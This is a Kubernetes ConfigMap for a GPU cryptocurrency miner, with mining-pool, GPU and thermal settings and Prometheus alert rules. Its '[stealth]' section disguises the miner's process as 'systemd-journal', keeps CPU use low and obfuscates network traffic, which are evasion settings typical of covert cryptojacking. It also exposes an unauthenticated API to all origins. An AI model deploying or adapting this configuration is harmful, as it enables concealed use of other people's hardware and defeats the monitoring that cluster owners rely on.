apiVersion: v1
kind: ConfigMap
metadata:
  name: opus-gpu-config
  namespace: opus-gpu
  labels:
    app: opus-gpu
    component: config
data:
  # Main configuration file
  app.toml: |
    # OPUS-GPU Miner Configuration
    # Generated for Kubernetes deployment

    [system]
    log_level = "info"
    log_format = "json"
    log_file = "/var/log/opus-gpu/miner.log"
    pid_file = "/tmp/opus-gpu.pid"

    [api]
    enabled = true
    host = "0.0.0.0"
    port = 8080
    cors_allowed_origins = ["*"]

    [api.auth]
    enabled = false  # Enable in production
    # jwt_secret will be loaded from Secret

    [metrics]
    enabled = true
    port = 9090
    path = "/metrics"

    [gpu]
    # GPU configuration will be auto-detected
    auto_detect = true
    min_compute_capability = "6.0"

    # GPU resource limits
    max_gpus = 2
    max_memory_per_gpu = "8GB"
    max_power_per_gpu = 250  # Watts

    [gpu.thermal]
    max_temperature = 85     # Celsius
    target_temperature = 75
    fan_min_speed = 40       # Percentage
    fan_max_speed = 100

    [mining]
    algorithm = "ethash"     # Example - adjust based on use case
    pool_url = "stratum+tcp://pool.example.com:3333"
    wallet_address = ""      # Load from Secret
    worker_name = "k8s-worker"

    [mining.performance]
    threads_per_gpu = 2
    batch_size = 256
    intensity = 20

    [stealth]
    enabled = true
    process_name = "systemd-journal"
    cpu_limit = 5            # Max CPU usage percentage
    network_obfuscation = true

    [monitoring]
    enabled = true
    interval_seconds = 5
    export_prometheus = true

    [logging]
    level = "info"
    format = "json"
    output = "stdout"        # In k8s, log to stdout for log aggregation

  # Prometheus alerting rules (optional)
  prometheus-rules.yml: |
    groups:
      - name: opus_gpu_alerts
        interval: 30s
        rules:
          # High GPU Temperature Alert
          - alert: HighGPUTemperature
            expr: gpu_temperature_celsius > 85
            for: 2m
            labels:
              severity: warning
            annotations:
              summary: "GPU temperature too high"
              description: "GPU {{ $labels.gpu_id }} temperature is {{ $value }}°C"

          # GPU Memory Alert
          - alert: HighGPUMemoryUsage
            expr: (gpu_memory_used_bytes / gpu_memory_total_bytes) > 0.95
            for: 5m
            labels:
              severity: warning
            annotations:
              summary: "GPU memory usage high"
              description: "GPU {{ $labels.gpu_id }} memory usage at {{ $value | humanizePercentage }}"

          # Mining Performance Alert
          - alert: LowHashrate
            expr: mining_hashrate_mhs < 50
            for: 10m
            labels:
              severity: info
            annotations:
              summary: "Mining hashrate below threshold"
              description: "Current hashrate: {{ $value }} MH/s"

          # Service Down Alert
          - alert: MinerDown
            expr: up{job="opus-gpu-miner"} == 0
            for: 2m
            labels:
              severity: critical
            annotations:
              summary: "OPUS-GPU miner is down"
              description: "Miner service has been down for 2 minutes"
